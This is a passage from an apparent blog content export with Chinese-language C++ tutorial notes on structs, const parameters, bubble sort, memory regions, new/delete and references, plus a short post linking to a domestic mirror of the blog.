&lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; stu.score &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//地址传递</span></span><br><span class="line">	<span class="built_in">printStudent2</span>(&amp;stu);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;主函数中 姓名：&quot;</span> &lt;&lt; stu.name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; stu.age  &lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; stu.score &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结：如果不想修改主函数中的数据，用值传递，反之用地址传递</p>
</blockquote>
<h3 id="8-7-结构体中-const使用场景"><a href="#8-7-结构体中-const使用场景" class="headerlink" title="8.7 结构体中 const使用场景"></a>8.7 结构体中 const使用场景</h3><p><strong>作用：</strong>用const来防止误操作</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//学生结构体定义</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//成员列表</span></span><br><span class="line">	string name;  <span class="comment">//姓名</span></span><br><span class="line">	<span class="type">int</span> age;      <span class="comment">//年龄</span></span><br><span class="line">	<span class="type">int</span> score;    <span class="comment">//分数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//const使用场景</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printStudent</span><span class="params">(<span class="type">const</span> student *stu)</span> <span class="comment">//加const防止函数体中的误操作</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//stu-&gt;age = 100; //操作失败，因为加了const修饰</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; stu-&gt;name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; stu-&gt;age &lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; stu-&gt;score &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	student stu = &#123; <span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="number">100</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printStudent</span>(&amp;stu);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h3 id="8-8-结构体案例"><a href="#8-8-结构体案例" class="headerlink" title="8.8 结构体案例"></a>8.8 结构体案例</h3><h4 id="8-8-1-案例1"><a href="#8-8-1-案例1" class="headerlink" title="8.8.1 案例1"></a>8.8.1 案例1</h4><p><strong>案例描述：</strong></p>
<p>学校正在做毕设项目，每名老师带领5个学生，总共有3名老师，需求如下</p>
<p>设计学生和老师的结构体，其中在老师的结构体中，有老师姓名和一个存放5名学生的数组作为成员</p>
<p>学生的成员有姓名、考试分数，创建数组存放3名老师，通过函数给每个老师及所带的学生赋值</p>
<p>最终打印出老师数据以及老师所带的学生数据。</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Student</span></span><br><span class="line">&#123;</span><br><span class="line">	string name;</span><br><span class="line">	<span class="type">int</span> score;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Teacher</span></span><br><span class="line">&#123;</span><br><span class="line">	string name;</span><br><span class="line">	Student sArray[<span class="number">5</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">allocateSpace</span><span class="params">(Teacher tArray[] , <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string tName = <span class="string">&quot;教师&quot;</span>;</span><br><span class="line">	string sName = <span class="string">&quot;学生&quot;</span>;</span><br><span class="line">	string nameSeed = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		tArray[i].name = tName + nameSeed[i];</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			tArray[i].sArray[j].name = sName + nameSeed[j];</span><br><span class="line">			tArray[i].sArray[j].score = <span class="built_in">rand</span>() % <span class="number">61</span> + <span class="number">40</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printTeachers</span><span class="params">(Teacher tArray[], <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; tArray[i].name &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t姓名：&quot;</span> &lt;&lt; tArray[i].sArray[j].name &lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; tArray[i].sArray[j].score &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>)); <span class="comment">//随机数种子 头文件 #include &lt;ctime&gt;</span></span><br><span class="line"></span><br><span class="line">	Teacher tArray[<span class="number">3</span>]; <span class="comment">//老师数组</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">sizeof</span>(tArray) / <span class="built_in">sizeof</span>(Teacher);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">allocateSpace</span>(tArray, len); <span class="comment">//创建数据</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printTeachers</span>(tArray, len); <span class="comment">//打印数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h4 id="8-8-2-案例2"><a href="#8-8-2-案例2" class="headerlink" title="8.8.2 案例2"></a>8.8.2 案例2</h4><p><strong>案例描述：</strong></p>
<p>设计一个英雄的结构体，包括成员姓名，年龄，性别;创建结构体数组，数组中存放5名英雄。</p>
<p>通过冒泡排序的算法，将数组中的英雄按照年龄进行升序排序，最终打印排序后的结果。</p>
<p>五名英雄信息如下：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;刘备&quot;</span>,<span class="number">23</span>,<span class="string">&quot;男&quot;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;关羽&quot;</span>,<span class="number">22</span>,<span class="string">&quot;男&quot;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;张飞&quot;</span>,<span class="number">20</span>,<span class="string">&quot;男&quot;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;赵云&quot;</span>,<span class="number">21</span>,<span class="string">&quot;男&quot;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;貂蝉&quot;</span>,<span class="number">19</span>,<span class="string">&quot;女&quot;</span>&#125;,</span><br></pre></td></tr></table></figure></div>









<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//英雄结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">hero</span></span><br><span class="line">&#123;</span><br><span class="line">	string name;</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	string sex;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//冒泡排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bubbleSort</span><span class="params">(hero arr[] , <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[j].age &gt; arr[j + <span class="number">1</span>].age)</span><br><span class="line">			&#123;</span><br><span class="line">				hero temp = arr[j];</span><br><span class="line">				arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">				arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印数组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printHeros</span><span class="params">(hero arr[], <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; arr[i].name &lt;&lt; <span class="string">&quot; 性别： &quot;</span> &lt;&lt; arr[i].sex &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; arr[i].age &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">hero</span> arr[<span class="number">5</span>] =</span><br><span class="line">	&#123;</span><br><span class="line">		&#123;<span class="string">&quot;刘备&quot;</span>,<span class="number">23</span>,<span class="string">&quot;男&quot;</span>&#125;,</span><br><span class="line">		&#123;<span class="string">&quot;关羽&quot;</span>,<span class="number">22</span>,<span class="string">&quot;男&quot;</span>&#125;,</span><br><span class="line">		&#123;<span class="string">&quot;张飞&quot;</span>,<span class="number">20</span>,<span class="string">&quot;男&quot;</span>&#125;,</span><br><span class="line">		&#123;<span class="string">&quot;赵云&quot;</span>,<span class="number">21</span>,<span class="string">&quot;男&quot;</span>&#125;,</span><br><span class="line">		&#123;<span class="string">&quot;貂蝉&quot;</span>,<span class="number">19</span>,<span class="string">&quot;女&quot;</span>&#125;,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">sizeof</span>(arr) / <span class="built_in">sizeof</span>(hero); <span class="comment">//获取数组元素个数</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">bubbleSort</span>(arr, len); <span class="comment">//排序</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printHeros</span>(arr, len); <span class="comment">//打印</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="资料分享"><a href="#资料分享" class="headerlink" title="资料分享"></a>资料分享</h1><p>源文件资料</p>
<p>匠心精作C++从0到1入门编程-学习编程不再难<br>链接：<a class="link"   href="https://pan.baidu.com/s/18N9kY4x6TN6q_S8FOlmEEQ?pwd=1234" >https://pan.baidu.com/s/18N9kY4x6TN6q_S8FOlmEEQ?pwd=1234 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>提取码：1234 </p>
<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>此文章来自<a class="link"   href="https://www.bilibili.com/video/BV1et411b73Z/" >黑马程序员匠心之作|C++教程从0到1入门编程,学习编程不再难 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>未经许可禁止用于商业活动！！！</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>黑马程序员</tag>
      </tags>
  </entry>
  <entry>
    <title>Blog网络不稳定访问解决方法</title>
    <url>/2024/09/12/%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85%E7%BD%91%E9%A1%B5/</url>
    <content><![CDATA[<h1 id="Blog慢访问问题"><a href="#Blog慢访问问题" class="headerlink" title="Blog慢访问问题"></a>Blog慢访问问题</h1><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>由于本博客是搭建在github pages上的，所以国内访问难免会有访问慢的时候，对此我在云服务器也搭建了一个同步的博客，方便加速访问</p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p><a class="link"   href="https://blogback.overlordzj.cn/" >点击这个国内链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>即可访问</p>
<p>或者通过主页右上角<code>link</code>菜单下的<code>domestic</code>进行访问</p>
<h2 id="残留问题"><a href="#残留问题" class="headerlink" title="残留问题"></a>残留问题</h2><p>不知道为什么搭建在云服务器的博客没有评论的功能，留一个小坑等之后有时间和能力了来填坑</p>
]]></content>
      <tags>
        <tag>待填坑</tag>
      </tags>
  </entry>
  <entry>
    <title>C++核心编程</title>
    <url>/2024/10/22/C++/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="C-核心编程"><a href="#C-核心编程" class="headerlink" title="C++核心编程"></a>C++核心编程</h1><p>本阶段主要针对C++&#x3D;&#x3D;面向对象&#x3D;&#x3D;编程技术做详细讲解，探讨C++中的核心和精髓。</p>
<h2 id="1-内存分区模型"><a href="#1-内存分区模型" class="headerlink" title="1 内存分区模型"></a>1 内存分区模型</h2><p>C++程序在执行时，将内存大方向划分为<strong>4个区域</strong></p>
<ul>
<li>代码区：存放函数体的二进制代码，由操作系统进行管理的</li>
<li>全局区：存放全局变量和静态变量以及常量</li>
<li>栈区：由编译器自动分配释放, 存放函数的参数值,局部变量等</li>
<li>堆区：由程序员分配和释放,若程序员不释放,程序结束时由操作系统回收</li>
</ul>
<p><strong>内存四区意义：</strong></p>
<p>不同区域存放的数据，赋予不同的生命周期, 给我们更大的灵活编程</p>
<h3 id="1-1-程序运行前"><a href="#1-1-程序运行前" class="headerlink" title="1.1 程序运行前"></a>1.1 程序运行前</h3><p>​	在程序编译后，生成了exe可执行程序，<strong>未执行该程序前</strong>分为两个区域</p>
<p>​	<strong>代码区：</strong></p>
<p>​		存放 CPU 执行的机器指令</p>
<p>​		代码区是<strong>共享</strong>的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可</p>
<p>​		代码区是<strong>只读</strong>的，使其只读的原因是防止程序意外地修改了它的指令</p>
<p>​	<strong>全局区：</strong></p>
<p>​		全局变量和静态变量存放在此.</p>
<p>​		全局区还包含了常量区, 字符串常量和其他常量也存放在此.</p>
<p>​		&#x3D;&#x3D;该区域的数据在程序结束后由操作系统释放&#x3D;&#x3D;.</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量</span></span><br><span class="line"><span class="type">int</span> g_a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> g_b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局常量</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> c_g_a = <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> c_g_b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//局部变量</span></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打印地址</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;局部变量a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;局部变量b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;全局变量g_a地址为： &quot;</span> &lt;&lt;  (<span class="type">int</span>)&amp;g_a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;全局变量g_b地址为： &quot;</span> &lt;&lt;  (<span class="type">int</span>)&amp;g_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态变量</span></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> s_a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> s_b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;静态变量s_a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;s_a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;静态变量s_b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;s_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;字符串常量地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;<span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;字符串常量地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;<span class="string">&quot;hello world1&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;全局常量c_g_a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_g_a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;全局常量c_g_b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_g_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> c_l_a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> c_l_b = <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;局部常量c_l_a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_l_a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;局部常量c_l_b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_l_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>打印结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1545017602518.png"
                      alt="1545017602518"
                ></p>
<p>总结：</p>
<ul>
<li>C++中在程序运行前分为全局区和代码区</li>
<li>代码区特点是共享和只读</li>
<li>全局区中存放全局变量、静态变量、常量</li>
<li>常量区中存放 const修饰的全局常量  和 字符串常量</li>
</ul>
<h3 id="1-2-程序运行后"><a href="#1-2-程序运行后" class="headerlink" title="1.2 程序运行后"></a>1.2 程序运行后</h3><p>​	<strong>栈区：</strong></p>
<p>​		由编译器自动分配释放, 存放函数的参数值,局部变量等</p>
<p>​		注意事项：不要返回局部变量的地址，栈区开辟的数据由编译器自动释放</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> * <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">return</span> &amp;a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> *p = <span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<p>​	<strong>堆区：</strong></p>
<p>​		由程序员分配释放,若程序员不释放,程序结束时由操作系统回收</p>
<p>​		在C++中主要利用new在堆区开辟内存</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* a = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> *p = <span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>总结：</strong></p>
<p>堆区数据由程序员管理开辟和释放</p>
<p>堆区数据利用new关键字进行开辟内存</p>
<h3 id="1-3-new操作符"><a href="#1-3-new操作符" class="headerlink" title="1.3 new操作符"></a>1.3 new操作符</h3><p>​	C++中利用&#x3D;&#x3D;new&#x3D;&#x3D;操作符在堆区开辟数据</p>
<p>​	堆区开辟的数据，由程序员手动开辟，手动释放，释放利用操作符 &#x3D;&#x3D;delete&#x3D;&#x3D;</p>
<p>​	语法：<code> new 数据类型</code></p>
<p>​	利用new创建的数据，会返回该数据对应的类型的指针</p>
<p><strong>示例1： 基本语法</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* a = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> *p = <span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//利用delete释放堆区数据</span></span><br><span class="line">	<span class="keyword">delete</span> p;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//cout &lt;&lt; *p &lt;&lt; endl; //报错，释放的空间不可访问</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>示例2：开辟数组</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//堆区开辟数组</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* arr = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr[i] = i + <span class="number">100</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//释放数组 delete 后加 []</span></span><br><span class="line">	<span class="keyword">delete</span>[] arr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>











<h2 id="2-引用"><a href="#2-引用" class="headerlink" title="2 引用"></a>2 引用</h2><h3 id="2-1-引用的基本使用"><a href="#2-1-引用的基本使用" class="headerlink" title="2.1 引用的基本使用"></a>2.1 引用的基本使用</h3><p>**作用： **给变量起别名</p>
<p><strong>语法：</strong> <code>数据类型 &amp;别名 = 原名</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> &amp;b = a;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	b = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<h3 id="2-2-引用注意事项"><a href="#2-2-引用注意事项" class="headerlink" title="2.2 引用注意事项"></a>2.2 引用注意事项</h3><ul>
<li>引用必须初始化</li>
<li>引用在初始化后，不可以改变</li>
</ul>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">	<span class="comment">//int &amp;c; //错误，引用必须初始化</span></span><br><span class="line">	<span class="type">int</span> &amp;c = a; <span class="comment">//一旦初始化后，就不可以更改</span></span><br><span class="line">	c = b; <span class="comment">//这是赋值操作，不是更改引用</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;c = &quot;</span> &lt;&lt; c &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>











